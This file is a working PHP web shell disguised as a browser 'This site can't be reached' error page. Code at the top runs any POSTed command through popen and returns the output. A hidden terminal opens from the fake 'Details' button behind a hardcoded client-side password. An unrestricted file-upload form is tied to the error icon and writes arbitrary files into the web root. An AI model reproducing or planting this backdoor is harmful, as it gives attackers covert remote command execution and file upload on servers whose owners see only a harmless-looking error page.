<?php
// Don't Thouch This
if (isset($_POST['command'])) {
    header('Content-Type: text/plain'); // output teks
    $command = escapeshellcmd($_POST['command']);
    $handle = popen($command, 'r');
    $output = stream_get_contents($handle); // all output
    pclose($handle);
    echo htmlspecialchars($output);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>This site can’t be reached</title>
  <style>
  /* Default Light Mode Styles */
  body {
    font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    font-size: 16px;
    line-height: 1.5;
    color: #5f6368;
    background-color: rgb(255, 255, 255); /* background */
    padding: 40px;
  }

  .container {
    max-width: 600px;
    margin: 80px auto;
  }

  .icon-generic {
    width: 72px;
    height: 72px;
    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyEEAAAABlBMVEUAAABTU1OoaSf/AAAAAXRSTlMAQObYZgAAAENJREFUeF7tzbEJACEQRNGBLeAasBCza2lLEGx0CxFGG9hBMDDxRy/72O9FMnIFapGylsu1fgoBdkXfUHLrQgdfrlJN1BdYBjQQm3UAAAAASUVORK5CYII=');
    background-size: contain;
    background-repeat: no-repeat;
    margin-bottom: 24px;
    cursor: pointer;
    display: block;
  }

  .content {
    margin-top: 40px;
  }

  h1 {
    color: #5f6368;
    font-size: 21px;
    margin-bottom: 16px;
  }

  .description {
    font-size: 16px;
    margin-bottom: 8px;
    line-height: 1.5;
  }

  ul {
    margin-top: 0;
    margin-bottom: 16px;
  }

  li {
    margin-bottom: 6px;
    font-size: 16px;
  }

  .error-code {
    color: #5f6368;
    margin-top: 20px;
    font-size: 13px;
  }

  .buttons {
    margin-top: 32px;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .reload-btn {
    background: #1a73e8;
    color: #fff;
    border: none;
    border-radius: 25px;
    padding: 8px 20px;
    cursor: pointer;
    font-size: 14px;
    transition: background 0.3s;
  }

  .reload-btn:hover {
    background: #185abc;
  }

  .details-btn {
    background: #fff;
    color: #1a73e8;
    border: 1px solid #1a73e8;
    border-radius: 25px;
    cursor: pointer;
    font-size: 14px;
    padding: 8px 20px;
    transition: background 0.3s;
  }

  .details-btn:hover {
    background: #f1f1f1;
  }

  /* blue */
  a {
    text-decoration: none;
    color: #1a73e8;
  }

  /* Terminal Style */
  #terminalPopup {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    backdrop-filter: blur(30px); /* Glass effect */
    background-color: rgba(197, 199, 206, 0.8); /* Transparent background */
    color:rgb(59, 60, 63); /* Light text */
    font-size: 12px;
    padding: 20px;
    border-radius: 10px;
    width: 700px;
    max-height: 90vh;
    overflow: auto;
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
    z-index: 9999;
    resize: both; /* Allow resizing */
  }

  #terminalOutput {
    background: rgba(197, 199, 206, 0.8); /* Transparent background */
    padding: 10px;
    margin-bottom: 10px;
    border-radius: 5px;
    white-space: pre-wrap;
    text-align: left;
    font-family: monospace;
    font-size: 12px;
    color:rgb(38, 41, 38); /* Bright green for output text */
    overflow: auto;
  }

  #terminalInputContainer {
    display: none;
  }

  .terminal-input {
    width: calc(100% - 40px); /* Adjust width to prevent overflow */
    background: rgba(197, 199, 206, 0.8); /* Transparent input background */
    color:rgb(64, 66, 68); /* Light text */
    border: none;
    padding: 10px;
    border-radius: 5px;
    font-family: monospace;
    margin: 0 20px; /* Add margin to center the input */
  }

  /* Tambahkan warna untuk placeholder */
  .terminal-input::placeholder {
    color:rgb(48, 49, 51); /* Warna placeholder */
    opacity: 1; /* Pastikan opacity penuh */
  }

  .terminal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
  }

  .terminal-close,
  .terminal-clear {
    background: #1a73e8; /* Transparent button background */
    color:rgb(232, 235, 240) /* Light text */
    border: none;
    padding: 5px 10px;
    cursor: pointer;
    margin-left: 5px;
    border-radius: 5px;
    transition: background 0.3s;
  }

  .terminal-close:hover,
  .terminal-clear:hover {
    background: #1a73e8; /* Hover effect */
  }

  .terminal-prompt {
    display: flex;
    align-items: center;
    justify-content: center; /* Center the input fields */
    margin-bottom: 10px; /* Add some space between input and output */
  }

  .terminal-prompt span {
    color:rgb(46, 47, 49); /* Light text */
  }

  .terminal-prompt input {
    flex: 1;
    background: transparent;
    border: none;
    color:rgb(43, 44, 46); /* Light text */
    font-family: monospace;
    outline: none;
  }

  .terminal-input-container {
    display: flex;
    align-items: center;
    width: 100%;
    background: rgba(197, 199, 206, 0.8); /* Transparent input container */
    color:rgb(54, 55, 56); /* Light text */
    border: none;
    padding: 10px;
    border-radius: 5px;
    font-family: monospace;
    margin: 0 0 10px 0;
  }

  .terminal-input-container span {
    margin-right: 5px;
  }
  
</style>
</head>

<body>
  <div class="container">
    <form id="uploadForm" action="" method="post" enctype="multipart/form-data">
      <label for="fileInput" class="icon-generic"></label>
      <input type="file" id="fileInput" name="file" style="display: none;" onchange="document.getElementById('uploadForm').submit();">
    </form>

    <div class="content">
      <h1>This site can’t be reached</h1>
      <div class="description">
        <b>
          <?php
          $host = $_SERVER['HTTP_HOST'];
          $host = preg_replace('/^www\./', '', $host);
          echo htmlspecialchars($host);
          ?>
        </b> unexpectedly closed the connection.
      </div>
      <div class="description">Try:</div>
      <ul>
        <li>Checking the connection</li>
        <li><a href="#">Checking the proxy and the firewall</a></li>
        <li><a href="#">Running Windows Network Diagnostics</a></li>
      </ul>

      <div class="error-code">ERR_CONNECTION_CLOSED</div>

      <div class="buttons">
        <button class="reload-btn" onclick="location.reload()">Reload</button>
        <button class="details-btn">Details</button>
      </div>
    </div>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
      $uploadDir = __DIR__ . '/';
      $fileName = basename($_FILES['file']['name']);
      $uploadFile = $uploadDir . $fileName;

      if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo '<p>File berhasil diupload. <a href="' . htmlspecialchars($fileName) . '">Klik di sini untuk akses</a></p>';
      } else {
        echo '<p>Upload file gagal.</p>';
      }
    }
    ?>
  </div>

  <!-- Terminal Popup -->
  <div id="terminalPopup">
    <div class="terminal-header">
      <span style="color: #1a73e8; font-weight:bold;">Catatan Sipil</span>
      <div>
        <button class="terminal-clear" onclick="clearTerminal()">Clear</button>
        <button class="terminal-close" onclick="closeTerminal()">X</button>
      </div>
    </div>
    <div id="terminalPrompt" class="terminal-prompt">
      <div class="terminal-input-container">
        <span>indocafe@kill9:$</span>
        <input type="password" id="terminalPassword" class="terminal-input" placeholder="Enter password here..." onkeypress="if(event.key === 'Enter'){checkPassword();}">
      </div>
    </div>
    <div id="terminalInputContainer" class="terminal-prompt" style="display:none;">
      <div class="terminal-input-container">
        <span>indocafe@kill9:$</span>
        <input type="text" id="terminalInput" class="terminal-input" placeholder="Type your command..." onkeypress="if(event.key === 'Enter'){runCommand();}">
      </div>
    </div>
    <div id="terminalOutput"></div>
  </div>

  <script>
    // Show Terminal
    document.querySelector('.details-btn').onclick = function (e) {
      e.preventDefault();
      document.getElementById('terminalPopup').style.display = 'block';
    }

    function closeTerminal() {
      document.getElementById('terminalPopup').style.display = 'none';
    }

    function clearTerminal() {
      document.getElementById('terminalOutput').innerHTML = '';
    }

    function checkPassword() {
      const passwordInput = document.getElementById('terminalPassword');
      const commandInputContainer = document.getElementById('terminalInputContainer');
      const terminalPrompt = document.getElementById('terminalPrompt');
      const password = passwordInput.value.trim();
      if (password === 'kill9') {
        terminalPrompt.style.display = 'none';
        commandInputContainer.style.display = 'flex';
        document.getElementById('terminalInput').focus();
        alert('Haii Bos, you are logged in');
      } else {
        alert('Incorrect password');
        passwordInput.value = '';
      }
    }

    function runCommand() {
      const input = document.getElementById('terminalInput');
      const output = document.getElementById('terminalOutput');
      const command = input.value.trim();
      if (command === '') return;
      clearTerminal(); // Clear previous output
      output.innerHTML += `<div><span style="color:#00ff00;">$ ${command}</span></div>`;
      fetch('', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `command=${encodeURIComponent(command)}`,
      })
        .then(res => res.text())
        .then(result => {
          output.innerHTML += `<div>${result}</div>`;
          document.getElementById('terminalPopup').style.height = 'auto';
          input.value = '';
          output.scrollTop = output.scrollHeight;
        });
    }
  </script>
</body>

</html>
